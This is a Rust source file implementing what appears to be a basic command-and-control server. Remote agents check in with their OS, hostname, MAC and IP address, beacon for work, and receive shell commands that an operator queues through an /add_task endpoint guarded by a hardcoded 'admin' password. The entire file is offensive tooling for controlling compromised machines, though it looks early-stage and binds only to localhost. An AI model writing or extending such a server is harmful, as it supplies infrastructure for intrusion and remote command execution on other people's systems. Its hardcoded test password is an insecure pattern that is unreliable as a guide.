use bytes::Bytes;
use http_body_util::{BodyExt, Empty, Full};
use hyper::server::conn::http1;
use hyper::service::service_fn;
use hyper::{Method, Request, Response, StatusCode};
use hyper_util::rt::TokioIo;
use serde::Deserialize;
use std::collections::{HashMap, VecDeque};
use std::convert::Infallible;
use std::net::SocketAddr;
use std::str::FromStr;
use std::sync::{Arc, Mutex};
use tokio::net::TcpListener;
use uuid::Uuid;

#[derive(Deserialize, Debug)]
struct Beacon {
    id: String,
    os: String,
    hostname: String,
}
#[derive(Deserialize, Debug)]
struct CheckIn {
    os: String,
    hostname: String,
    mac: String,
    ip: String,
}
#[derive(Debug)]
struct Agent {
    os: String,
    hostname: String,
    mac: String,
    ip: String,
}
#[derive(Debug)]
struct Task {
    command: String,
}

type AgentId = Uuid;
type TaskId = Uuid;

#[derive(Debug, Deserialize)]
struct AddTask {
    password: String,
    id: String,
    command: String,
}

struct State {
    agents: HashMap<AgentId, Agent>,
    tasks: HashMap<TaskId, Task>,
    tasks_by_agents: HashMap<AgentId, VecDeque<TaskId>>,
}

impl State {
    fn new() -> Self {
        State {
            agents: HashMap::new(),
            tasks: HashMap::new(),
            tasks_by_agents: HashMap::new(),
        }
    }
}

fn handle_checkin(
    data: CheckIn,
    state: Arc<Mutex<State>>,
) -> Result<Response<Full<Bytes>>, Infallible> {
    let agent_id = {
        let mut guard = state.lock().unwrap();
        let agent = Agent {
            os: data.os,
            hostname: data.hostname,
            mac: data.mac,
            ip: data.ip,
        };
        let uuid_v4 = Uuid::new_v4();
        guard.agents.insert(uuid_v4, agent);
        uuid_v4
    };
    println!("{:#?}", Arc::clone(&state).lock().unwrap().agents);
    Ok(Response::new(Full::new(Bytes::from(agent_id.to_string()))))
}

fn handle_beacon(
    data: Beacon,
    state: Arc<Mutex<State>>,
) -> Result<Response<Full<Bytes>>, Infallible> {
    println!("Received beacon: {:?}", data);
    let agent_id: AgentId = {
        let guard = state.lock().unwrap();
        let uuid_v4 = match Uuid::parse_str(data.id.as_str()) {
            Ok(val) => val,
            Err(_) => {
                let mut bad_request = Response::new(Full::new(Bytes::from(
                    "Bad Request: Invalid format of Uuid",
                )));
                *bad_request.status_mut() = StatusCode::BAD_REQUEST;
                return Ok(bad_request);
            }
        };
        if !guard.agents.contains_key(&uuid_v4) {
            let mut bad_request =
                Response::new(Full::new(Bytes::from("Bad Request: Invalid AgentId")));
            *bad_request.status_mut() = StatusCode::BAD_REQUEST;
            return Ok(bad_request);
        } else {
            uuid_v4
        }
    };

    let task_id: TaskId = {
        let guard = state.lock().unwrap();
        if !guard.tasks_by_agents.contains_key(&agent_id) {
            return Ok(Response::new(Full::new(Bytes::from("no tasks"))));
        }

        match guard.tasks_by_agents.get(&agent_id).unwrap().front() {
            Some(val) => val.to_owned(),
            None => return Ok(Response::new(Full::new(Bytes::from("no tasks")))),
        }
    };

    let task: Task = {
        let guard = state.lock().unwrap();
        let task = guard.tasks.get(&task_id).unwrap();
        Task {
            command: task.command.to_owned(),
        }
    };

    Ok(Response::new(Full::new(Bytes::from(format!(
        "you have task \n{:#?}",
        task
    )))))
}

fn handle_add_task(
    data: AddTask,
    state: Arc<Mutex<State>>,
) -> Result<Response<Full<Bytes>>, Infallible> {
    // check temp password - just for testing
    if data.password != "admin" {
        let mut bad_request = Response::new(Full::new(Bytes::from("Unauthorized: bad password")));
        *bad_request.status_mut() = StatusCode::UNAUTHORIZED;
        return Ok(bad_request);
    }

    let (task_id, agent_id): (TaskId, AgentId) = {
        let guard = state.lock().unwrap();

        let uuid_v4 = match Uuid::parse_str(data.id.as_str()) {
            Ok(val) => val,
            Err(_) => {
                let mut bad_request = Response::new(Full::new(Bytes::from(
                    "Bad Request: Invalid format of Uuid",
                )));
                *bad_request.status_mut() = StatusCode::BAD_REQUEST;
                return Ok(bad_request);
            }
        };

        if !guard.agents.contains_key(&uuid_v4) {
            let mut bad_request =
                Response::new(Full::new(Bytes::from("Bad Request: Invalid AgentId")));
            *bad_request.status_mut() = StatusCode::BAD_REQUEST;
            return Ok(bad_request);
        } else {
            let task_id = Uuid::new_v4();
            (task_id, uuid_v4)
        }
    };
    let mut guard = state.lock().unwrap();
    guard.tasks.insert(
        task_id.clone(),
        Task {
            command: data.command,
        },
    );

    if guard.tasks_by_agents.contains_key(&agent_id) {
        guard
            .tasks_by_agents
            .entry(agent_id.clone())
            .and_modify(|queue| queue.push_back(task_id.clone()));
    } else {
        guard.tasks_by_agents.insert(agent_id.clone(), {
            let mut queue = VecDeque::new();
            queue.push_back(task_id.clone());
            queue
        });
    }

    Ok(Response::new(Full::new(Bytes::from(format!(
        "task {} added for agent {}",
        task_id, agent_id
    )))))
}

async fn handle_request(
    req: Request<hyper::body::Incoming>,
    state: Arc<Mutex<State>>,
) -> Result<Response<Full<Bytes>>, Infallible> {
    let (req_method, req_path) = (req.method().clone(), &req.uri().path().to_owned());

    let body_bytes = match req.collect().await {
        Ok(collected) => collected.to_bytes(),
        Err(_) => {
            let mut bad_request = Response::new(Full::new(Bytes::from("Internal Server Error")));
            *bad_request.status_mut() = StatusCode::INTERNAL_SERVER_ERROR;
            return Ok(bad_request);
        }
    };

    match (&req_method, req_path.as_str()) {
        (&Method::POST, "/checkin") => {
            let check_in: CheckIn = match serde_json::from_slice(&body_bytes) {
                Ok(data) => data,
                Err(_) => {
                    let mut bad_request =
                        Response::new(Full::new(Bytes::from("Bad Request: Invalid Json")));
                    *bad_request.status_mut() = StatusCode::BAD_REQUEST;
                    return Ok(bad_request);
                }
            };
            handle_checkin(check_in, Arc::clone(&state))
        }
        (&Method::POST, "/beacon") => {
            let beacon: Beacon = match serde_json::from_slice(&body_bytes) {
                Ok(data) => data,
                Err(_) => {
                    let mut bad_request =
                        Response::new(Full::new(Bytes::from("Bad Request: Invalid Json")));
                    *bad_request.status_mut() = StatusCode::BAD_REQUEST;
                    return Ok(bad_request);
                }
            };

            handle_beacon(beacon, Arc::clone(&state))
        }
        (&Method::POST, "/add_task") => {
            let addtask: AddTask = match serde_json::from_slice(&body_bytes) {
                Ok(data) => data,
                Err(_) => {
                    let mut bad_request =
                        Response::new(Full::new(Bytes::from("Bad Request: Invalid Json")));
                    *bad_request.status_mut() = StatusCode::BAD_REQUEST;
                    return Ok(bad_request);
                }
            };
            handle_add_task(addtask, Arc::clone(&state))
        }
        (&Method::GET, "/list") => {
            let lock = state.lock().unwrap();
            return Ok(Response::new(Full::new(Bytes::from(format!(
                "{:#?}",
                lock.agents,
            )))));
        }
        _ => {
            let mut not_found = Response::new(Full::new(Bytes::from("Not Found")));
            *not_found.status_mut() = StatusCode::NOT_FOUND;
            Ok(not_found)
        }
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let addr = SocketAddr::from(([127, 0, 0, 1], 8080));
    let listener = TcpListener::bind(addr).await?;
    println!("Listening on http://{}", addr);
    let state = Arc::new(Mutex::new(State::new()));
    // The new server loop. It spawns a task for each incoming connection.
    loop {
        let state = Arc::clone(&state);
        let (stream, _) = listener.accept().await?;
        let io = TokioIo::new(stream);

        let svc = service_fn(move |req| {
            let state = Arc::clone(&state);
            handle_request(req, state)
        });

        tokio::task::spawn(async move {
            if let Err(err) = http1::Builder::new().serve_connection(io, svc).await {
                eprintln!("Error serving connection: {:?}", err);
            }
        });
    }
}
